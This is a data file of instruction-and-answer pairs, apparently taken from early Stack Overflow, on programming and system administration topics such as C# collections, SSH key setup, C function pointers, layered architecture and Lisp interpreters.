{"instruction": "So I've been poking around with C# a bit lately, and all the Generic Collections have me a little confused. Say I wanted to represent a data structure where the head of a tree was a key value pair, and then there is one optional list of key value pairs below that (but no more levels than these). Would this be suitable?\npublic class TokenTree\n{\n    public TokenTree()\n    {\n        /* I must admit to not fully understanding this,\n         * I got it from msdn. As far as I can tell, IDictionary is an\n         * interface, and Dictionary is the default implementation of\n         * that interface, right?\n         */\n        SubPairs = new Dictionary<string, string>();\n    }\n\n    public string Key;\n    public string Value;\n    public IDictionary<string, string> SubPairs;\n}\n\nIt's only really a simple shunt for passing around data.", "output": "I think what you might be after (as a literal implementation of you question) is:\npubic class TokenTree\n{\n    public TokenTree()\n    {\n        tree = new Dictionary<string, IDictionary<string,string>>();\n    }\n\n    IDictionary<string, IDictionary<string, string>> tree; \n}\n\nYou did actually say a \"list\" of key-values in your question so you might want to swap the inner IDictionary with a:\nIList<KeyValuePair<string, string>>"}
{"instruction": "Using the Windows API, how can I get a list of domains on my network?", "output": "Answered my own question:\nUse the NetServerEnum function, passing in the SV_TYPE_DOMAIN_ENUM constant for the \"servertype\" argument.\nIn Delphi, the code looks like this:\n<snip>\ntype\n  NET_API_STATUS = DWORD;\n  PSERVER_INFO_100 = ^SERVER_INFO_100;\n  SERVER_INFO_100 = packed record\n    sv100_platform_id : DWORD;\n    sv100_name        : PWideChar;\nend;\n\nfunction NetServerEnum(  //get a list of pcs on the network (same as DOS cmd \"net view\")\n  const servername    : PWideChar;\n  const level         : DWORD;\n  const bufptr        : Pointer;\n  const prefmaxlen    : DWORD;\n  const entriesread   : PDWORD;\n  const totalentries  : PDWORD;\n  const servertype    : DWORD;\n  const domain        : PWideChar;\n  const resume_handle : PDWORD\n) : NET_API_STATUS; stdcall; external 'netapi32.dll';\n\nfunction NetApiBufferFree(  //memory mgmt routine\n  const Buffer : Pointer\n) : NET_API_STATUS; stdcall; external 'netapi32.dll';\n\nconst\n  MAX_PREFERRED_LENGTH = DWORD(-1);\n  NERR_Success = 0;\n  SV_TYPE_ALL  = $FFFFFFFF;\n  SV_TYPE_DOMAIN_ENUM = $80000000;\n\n\nfunction TNetwork.ComputersInDomain: TStringList;\nvar\n  pBuffer        : PSERVER_INFO_100;\n  pWork          : PSERVER_INFO_100;\n  dwEntriesRead  : DWORD;\n  dwTotalEntries : DWORD;\n  i              : integer;\n  dwResult       : NET_API_STATUS;\nbegin\n  Result := TStringList.Create;\n  Result.Clear;\n\n  dwResult := NetServerEnum(nil,100,@pBuffer,MAX_PREFERRED_LENGTH,\n                            @dwEntriesRead,@dwTotalEntries,SV_TYPE_DOMAIN_ENUM,\n                            PWideChar(FDomainName),nil);\n\n  if dwResult = NERR_SUCCESS then begin\n    try\n      pWork := pBuffer;\n      for i := 1 to dwEntriesRead do begin\n        Result.Add(pWork.sv100_name);\n        inc(pWork);\n      end;  //for i\n    finally\n      NetApiBufferFree(pBuffer);\n    end;  //try-finally\n  end  //if no error\n  else begin\n    raise Exception.Create('Error while retrieving computer list from domain ' +\n                           FDomainName + #13#10 +\n                           SysErrorMessage(dwResult));\n  end;\nend;\n<snip>"}
{"instruction": "Using the Windows API, how can I get a list of domains on my network?", "output": "You will need to use some LDAP queries\nHere is some code I have used in a previous script (it was taken off the net somewhere, and I've left in the copyright notices)\n' This VBScript code gets the list of the domains contained in the \n' forest that the user running the script is logged into\n\n' ---------------------------------------------------------------\n' From the book \"Active Directory Cookbook\" by Robbie Allen\n' Publisher: O'Reilly and Associates\n' ISBN: 0-596-00466-4\n' Book web site: http://rallenhome.com/books/adcookbook/code.html\n' ---------------------------------------------------------------\n\nset objRootDSE = GetObject(\"LDAP://RootDSE\")\nstrADsPath =  \"<GC://\" & objRootDSE.Get(\"rootDomainNamingContext\") & \">;\"\nstrFilter  = \"(objectcategory=domainDNS);\"\nstrAttrs   = \"name;\"\nstrScope   = \"SubTree\"\n\nset objConn = CreateObject(\"ADODB.Connection\")\nobjConn.Provider = \"ADsDSOObject\"\nobjConn.Open \"Active Directory Provider\"\nset objRS = objConn.Execute(strADsPath & strFilter & strAttrs & strScope)\nobjRS.MoveFirst\nwhile Not objRS.EOF\n    Wscript.Echo objRS.Fields(0).Value\n    objRS.MoveNext\nwend\n\n\nAlso a C# version"}
{"instruction": "When opening Adobe Acrobat Pro, whether it be through Applescript or finder, the introductory dialog is shown.  Is there a way to not show this dialog without already having checked the \"Don't Show Again\" option when opening a document using Applescript?  \nPhotoshop and Illustrator Applescript libraries have ways of setting interaction levels and not showing dialogs, but I can't seem to find the option in Acrobat.", "output": "Copy any applicable preferences files in ~/Library/Preferences from a machine that you have checked \"Don't show again\" on."}
{"instruction": "We have a SharePoint WSS site and some of our users on on the Mac OSX platform.  Are there any tips or tricks to get a similar experience to Windows with document shares and calendars on the Mac?\nEdit: Browsing a SharePoint WSS site on a Mac, whether using Firefox or Safari, has a very similar look and feel as it does on Windows IE.  The similar experience I am looking for has to do with integrating the calendars, document shares, etc. into the desktop.\nFor example, with IE you can go to a calendar and select \"Actions -> Connect to Outlook\" and it will make the calendar visible and manageable from within Outlook.\nIs there any way to get the Mac to work similarly?", "output": "Unfortunately, the \"full\" Sharepoint Experience is limited to running Internet Explorer 6/7 and Office 2007.\nOn the Mac, I recommend using Firefox (Camino?) which seems to work a bit better than Safari.\nEdit: When you say \"Similar experience\", what exactly are you missing? I don't have any Mac here, but I was under the impression that Office 2008 will have a working integration with Sharepoint as well."}
{"instruction": "Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well?", "output": "I don't have a Mac here, but there is some Documentation up here:\nhttp://developer.apple.com/documentation/Hardware/Conceptual/iSightProgGuide/01introduction/chapter_1_section_1.html\nIt looks like you have to go through the QuickTime API. There is supposed to be a Sample Project called \"MungGrab\" which could be worth a look according to this thread."}
{"instruction": "With VMWare Server running under Linux (Debain), I would like to have the following setup:\n\n1st: NIC being used by many of the\nimages running under VMWare, as well\nas being used by the Linux OS \n2nd: NIC being used by only 1 image and to be unused by the Linux OS (as its part of a DMZ)\n\nAlthough the second NIC won't be used by Linux, it is certainly recognised as a NIC (e.g. eth1).\nIs this possible under VMWare Server, and if so, is it as simple as not binding eth1 under Linux and then bridging it to the image under VMWare Server?", "output": "I believe you can set the desired solution up by rerunning the vmware configuration script.  And doing a custom network setup, so that both NIC's are mapped to your vmware instance.  I would recommend making eth0 the 2nd NIC since it will be easier for Linux to use by default.  Then make eth1 the 1st NIC."}
{"instruction": "How do I setup Public-Key Authentication for SSH?", "output": "If you have SSH installed, you should be able to run..\nssh-keygen\n\nThen go through the steps, you'll have two files, id_rsa and id_rsa.pub (the first is your private key, the second is your public key - the one you copy to remote machines)\nThen, connect to the remote machine you want to login to, to the file ~/.ssh/authorized_keys add the contents of your that id_rsa.pub file.\nOh, and chmod 600 all the id_rsa* files (both locally and remote), so no other users can read them:\nchmod 600 ~/.ssh/id_rsa*\n\nSimilarly, ensure the remote ~/.ssh/authorized_keys file is chmod 600 also:\nchmod 600 ~/.ssh/authorized_keys\n\nThen, when you do ssh remote.machine, it should ask you for the key's password, not the remote machine.\n\nTo make it nicer to use, you can use ssh-agent to hold the decrypted keys in memory - this means you don't have to type your keypair's password every single time. To launch the agent, you run (including the back-tick quotes, which eval the output of the ssh-agent command)\n`ssh-agent`\n\nOn some distros, ssh-agent is started automatically. If you run echo $SSH_AUTH_SOCK and it shows a path (probably in /tmp/) it's already setup, so you can skip the previous command.\nThen to add your key, you do\nssh-add ~/.ssh/id_rsa\n\nand enter your passphrase. It's stored until you remove it (using the ssh-add -D command, which removes all keys from the agent)"}
{"instruction": "Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well?", "output": "Aside from ObjC, you can use the PyObjC or RubyCocoa bindings to access it also. If you're not picky about which language, I'd say use Ruby, as PyObjC is horribly badly documented (even the official Apple page on it refers to the old version, not the one that came with OS X Leopard)\nQuartz Composer is probably the easiest way to access it, and .quartz files can be embed in applications pretty easily (and the data piped out to ObjC or such)\nAlso, I suppose there should be an example or two of this in the /Developer/Examples/"}
{"instruction": "So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I've heard that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\r\nCan I get any recommendations?", "output": "I agree with basszero. I'm using mercurial under windows and it's as easy and reliable as it can get. My development team is spread over Europe (well Dublin and Vienna :-).\nWe use VPN to commit or sometime the built in webserver (hgserve). Both work fine with no problems out of the box.\nAlso diff3 open source tool works perfect with mercurial and TortoiseHG out of the box."}
{"instruction": "We have a SharePoint WSS site and some of our users on on the Mac OSX platform.  Are there any tips or tricks to get a similar experience to Windows with document shares and calendars on the Mac?\nEdit: Browsing a SharePoint WSS site on a Mac, whether using Firefox or Safari, has a very similar look and feel as it does on Windows IE.  The similar experience I am looking for has to do with integrating the calendars, document shares, etc. into the desktop.\nFor example, with IE you can go to a calendar and select \"Actions -> Connect to Outlook\" and it will make the calendar visible and manageable from within Outlook.\nIs there any way to get the Mac to work similarly?", "output": "Office 2008 allows limited connectivity to MOSS. However there is no Mac OS browser yet that is completely compatible to MOSS.\nI do have it on good authority the Microsoft Mac BU team is working with the MOSS team to see this changing in future versions of the platform, specifically around the Safari support."}
{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "My approach tends to be to ensure I can completely validate on all pages, however I still send the page as text/html instead of application/xhtml+xml so there are no ugly XML errors in the event I have missed something."}
{"instruction": "Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?\nWhat level do you hold your code to when you create it for:\na) yourself\nb) your clients\nP.S. Jeff and company, why doesn't stack overflow validate? :)\nEDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"\nI think I may post another question on stack overflow; \"Do you validate as you go or do you finish and then go back and validate?\" as that seems to be where this question is going", "output": "For me, I feel like I've done a good job if my code validates. Seeing the green check box on the w3c pages just makes me slightly giddy. As for group b, They usually only care that it looks and works the same across browsers. They only place I've found that this is not true is the government sector. They require complete validation not only with the w3c but also passing ADA tests (basically how does it sound with a screen reader). \np.s. when I say government sector, I mean specifically the state of California and a few counties inside it. I have had no ther experience with other government groups besides them."}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "I always create a separate assembly that contains:  \n\nA lot of small Interfaces (think ICreateRepository, IReadRepository, IReadListRepsitory.. the list goes on and most of them relies heavily on generics)  \nA lot of concrete Interfaces, like an IPersonRepository, that inherits from IReadRepository, you get the point..\nAnything you cannot describe with just the smaller interfaces, you put into the concrete interface.\nAs long as you use the IPersonRepository to declare your object, you get a clean, consistent interface to work with. But the kicker is, you can also make a class that takes f.x. a ICreateRepository in its constructor, so the code will end up being very easy to do some really funky stuff with. There are also interfaces for the Services in the business tier here.\nAt last i stick all the domain objects into the extra assembly, just to make the code base itself a bit cleaner and more loosely coupled. These objects dont have any logic, they are just a common way to describe the data for all 3+ layers.\n\nBtw. Why would you define methods in the business logic tier to accommodate the data tier?\nThe data tier should have no reason to even know there is a business tier.."}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "It could be a solution, as it would not erode the interface. I guess you could have a class like this:\npublic class BusinessObjectRecord : BusinessObject\n{\n}"}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "What do you mean by that the data tier should not be aware of the business logic tier? How would you fill an business object with data?\nI often do this:\nnamespace Data\n{\n    public class BusinessObjectDataManager\n    {\n         public void SaveObject(BusinessObject object)\n         {\n                // Exec stored procedure\n         {\n    }\n}"}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "This is a classic problem - separating your domain model from your database model. There are several ways to attack it, it really depends on the size of your project in my opinion. You could use the repository pattern as others have said. If you are using .net or java you could use NHibernate or Hibernate. \nWhat I do is use Test Driven Development so I write my UI and Model layers first and the Data layer is mocked, so the UI and model is build around domain specific objects, then later I map these object to what ever technology I'm using the the Data Layer. Is a very bad idea to let the database determine the design of your app, write the app first and think about the data later.\nps the title of the question is a little mis-leading"}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "@Ice^^Heat:\n\nWhat do you mean by that the data tier should not be aware of the business logic tier? How would you fill an business object with data?\n\nThe UI asks the ServiceClass in the business tier for a service, namely getting a list of objects filtered by an object with the needed parameter data.\nThen the ServiceClass creates an instance of one of the repository classes in the data tier, and calls the GetList(ParameterType filters).\nThen the data tier accesses the database, pulls up the data, and maps it to the common format defined in the \"domain\" assembly.\nThe BL has no more work to do with this data, so it outputs it to the UI.\nThen the UI wants to edit Item X. It sends the item (or business object) to the service in the Business Tier. The business tier validates the object, and if it is OK, it sends it to the data tier for storage.\nThe UI knows the service in the business tier which again knows about the data tier.\nThe UI is responsible for mapping the users data input to and from the objects, and the data tier is responsible for mapping the data in the db to and from the objects. The Business tier stays purely business. :)"}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "So the problem is that the business layer needs to expose more functionality to the data layer, and adding this functionality means exposing too much to the UI layer?  If I'm understanding your problem correctly, it sounds like you're trying to satisfy too much with a single interface, and that's just causing it to become cluttered.  Why not have two interfaces into the business layer?  One would be a simple, safe interface for the UI layer.  The other would be a lower-level interface for the data layer.\nYou can apply this two-interface approach to any objects which need to be passed to both the UI and the data layers, too.\npublic class BusinessLayer : ISimpleBusiness\n{}\n\npublic class Some3LayerObject : ISimpleSome3LayerObject\n{}"}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "You may want to split your interfaces into two types, namely:\n\nView interfaces -- which are interfaces that specify your interactions with your UI, and\nData interfaces -- which are interfaces that will allow you to specify interactions with your data\n\nIt is possible to inherit and implement both set of interfaces such that:\npublic class BusinessObject : IView, IData\n\nThis way, in your data layer you only need to see the interface implementation of IData, while in your UI you only need to see the interface implementation of IView.\nAnother strategy you might want to use is to compose your objects in the UI or Data layers such that they are merely consumed by these layers, e.g.,\npublic class BusinessObject : DomainObject\n\npublic class ViewManager<T> where T : DomainObject\n\npublic class DataManager<T> where T : DomainObject\n\nThis in turn allows your business object to remain ignorant of both the UI/View layer and the data layer."}
{"instruction": "I want to create a function that performs a function passed by parameter on a set of data. How do you pass a function as a parameter in C?", "output": "You need to pass a function pointer.  The syntax is a little cumbersome, but it's really powerful once you get familiar with it."}
{"instruction": "I want to create a function that performs a function passed by parameter on a set of data. How do you pass a function as a parameter in C?", "output": "Declaration\nA prototype for a function which takes a function parameter looks like the following:\nvoid func ( void (*f)(int) );\n\nThis states that the parameter f will be a pointer to a function which has a void return type and which takes a single int parameter. The following function (print) is an example of a function which could be passed to func as a parameter because it is the proper type:\nvoid print ( int x ) {\n  printf(\"%d\\n\", x);\n}\n\nFunction Call\nWhen calling a function with a function parameter, the value passed must be a pointer to a function. Use the function's name (without parentheses) for this:\nfunc(print);\n\nwould call func, passing the print function to it.\nFunction Body\nAs with any parameter, func can now use the parameter's name in the function body to access the value of the parameter. Let's say that func will apply the function it is passed to the numbers 0-4. Consider, first, what the loop would look like to call print directly:\nfor ( int ctr = 0 ; ctr < 5 ; ctr++ ) {\n  print(ctr);\n}\n\nSince func's parameter declaration says that f is the name for a pointer to the desired function, we recall first that if f is a pointer then *f is the thing that f points to (i.e. the function print in this case). As a result, just replace every occurrence of print in the loop above with *f:\nvoid func ( void (*f)(int) ) {\n  for ( int ctr = 0 ; ctr < 5 ; ctr++ ) {\n    (*f)(ctr);\n  }\n}\n\nFrom http://math.hws.edu/bridgeman/courses/331/f05/handouts/c-c++-notes.html"}
{"instruction": "I want to create a function that performs a function passed by parameter on a set of data. How do you pass a function as a parameter in C?", "output": "This question already has the answer for defining function pointers, however they can get very messy, especially if you are going to be passing them around your application. To avoid this unpleasantness I would recommend that you typedef the function pointer into something more readable. For example.\ntypedef void (*functiontype)();\n\nDeclares a function that returns void and takes no arguments. To create a function pointer to this type you can now do:\nvoid dosomething() { }\n\nfunctiontype func = &dosomething;\nfunc();\n\nFor a function that returns an int and takes a char you would do\ntypedef int (*functiontype2)(char);\n\nand to use it\nint dosomethingwithchar(char a) { return 1; }\n\nfunctiontype2 func2 = &dosomethingwithchar\nint result = func2('a');\n\nThere are libraries that can help with turning function pointers into nice readable types. The boost function library is great and is well worth the effort!\nboost::function<int (char a)> functiontype2;\n\nis so much nicer than the above."}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "If I understand the question correctly, you've created a domain model and you would like to write an object-relational mapper to map between records in your database and your domain objects. However, you're concerned about polluting your domain model with the 'plumbing' code that would be necessary to read and write to your object's fields.\nTaking a step back, you essentially have two choices of where to put your data mapping code - within the domain class itself or in an external mapping class.\nThe first option is often called the Active Record pattern and has the advantage that each object knows how to persist itself and has sufficient access to its internal structure to allow it to perform the mapping without needing to expose non-business related fields.\nE.g\npublic class User\n{\n\tprivate string name;\n\tprivate AccountStatus status;\n\n\tprivate User()\n\t{\n\t}\n\n\tpublic string Name\n\t{\n\t\tget { return name; }\n\t\tset { name = value; }\n\t}\n\n\tpublic AccountStatus Status\n\t{\n\t\tget { return status; }\n\t}\n\n\tpublic void Activate()\n\t{\n\t\tstatus = AccountStatus.Active;\n\t}\n\n\tpublic void Suspend()\n\t{\n\t\tstatus = AccountStatus.Suspended;\n\t}\n\n\tpublic static User GetById(int id)\n\t{\n\t\tUser fetchedUser = new User();\n\n\t\t// Lots of database and error-checking code\n\t\t// omitted for clarity\n\t\t// ...\n\n\t\tfetchedUser.name = (string) reader[\"Name\"];\n\t\tfetchedUser.status = (int)reader[\"statusCode\"] == 0 ? AccountStatus.Suspended : AccountStatus.Active;\n\n\t\treturn fetchedUser;\n\t}\n\n\tpublic static void Save(User user)\n\t{\n\t\t// Code to save User's internal structure to database\n\t\t// ...\n\t}\n}\n\nIn this example, we have an object that represents a User with a Name and an AccountStatus. We don't want to allow the Status to be set directly, perhaps because we want to check that the change is a valid status transition, so we don't have a setter. Fortunately, the mapping code in the GetById and Save static methods have full access to the object's name and status fields.\nThe second option is to have a second class that is responsible for the mapping. This has the advantage of seperating out the different concerns of business logic and persistence which can allow your design to be more testable and flexible. The challenge with this method is how to expose the name and status fields to the external class. Some options are:\n  1. Use reflection (which has no qualms about digging deep into your object's private parts)\n  2. Provide specially-named, public setters (e.g. prefix them with the word 'Private') and hope no one uses them accidentally\n  3. If your language suports it, make the setters internal but grant your data mapper module access. E.g. use the InternalsVisibleToAttribute in .NET 2.0 onwards or friend functions in C++\nFor more information, I'd recommend Martin Fowler's classic book 'Patterns of Enterprise Architecture'\nHowever, as a word of warning, before going down the path of writing your own mappers I'd strongly recommend looking at using a 3rd-party object relational mapper (ORM) tool such as nHibernate or Microsoft's Entity Framework. I've worked on four different projects where, for various reasons, we wrote our own mapper and it is very easy to waste a lot of time maintaining and extending the mapper instead of writing code that provides end user value. I've used nHibernate on one project so far and, although it has quite a steep learning curve initially, the investment you put in early on pays off considerably."}
{"instruction": "We have a question with regards to XML-sig and need detail about the optional elements as well as some of the canonicalization and transform stuff.  We're writing a spec for a very small XML-syntax payload that will go into the metadata of media files and it needs to by cryptographically signed.  Rather than re-invent the wheel, We thought we should use the XML-sig spec but I think most of it is overkill for what we need, and so we like to have more information/dialogue with people who know the details.\nSpecifically, do we need to care about either transforms or canonicalization if the XML is very basic with no tabs for formatting and is specific to our needs?", "output": "Can you let us know that technology you are using as there are some intresting bits out there around this stuff and some short cuts... i.e. WSE2 is complex beast and something that I dont like getting wrong!  \nI dont like developers doing this and there are WSE2 accelorators out there like SSL Accelorates as the processing of encryption has a hugh cost best to take it out of process from the normal code and the development arena.\nIf this is an option for you - Try look at this - ForumSystems"}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "Checkout CLISP wiki-link that ie. was used by Paul Graham\nDirect link"}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "Did you try Allegro CL from http://www.franz.com/?"}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "You could also try DrScheme, which whilst not exactly a standalone interpreter, isn't emacs :)\nIt's basically a simple IDE that has an area to type in code that can be executed as a file, and then another area that is the running interpreter that you can interact with.\n(Also, find the UC Berkeley CS61A podcasts and listen to them, as well as reading SICP)"}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "It looks like Steel Bank Common Lisp (SBCL) also caters to what you want:\nhttp://www.sbcl.org/manual/Shebang-Scripts.html#Shebang-Scripts\nSBCL is both top rate and open source."}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "What specifically does that question mean?\nDoes reverse mean setting 1's to 0's and vice versa?\nOr does it mean 00001100 --> 00110000 where you reverse their order in the byte? Or perhaps just reversing the part that is from the first 1 to the last 1? ie. 00110101 --> 00101011?\nAssuming it means reversing the bit order in the whole byte, here's an x86 assembler version:\n; al is input register\n; bl is output register\n\nxor bl, bl      ; clear output\n\n; first bit\nrcl al, 1       ; rotate al through carry\nrcr bl, 1       ; rotate carry into bl\n\n; duplicate above 2-line statements 7 more times for the other bits\n\nnot the most optimal solution, a table lookup is faster."}
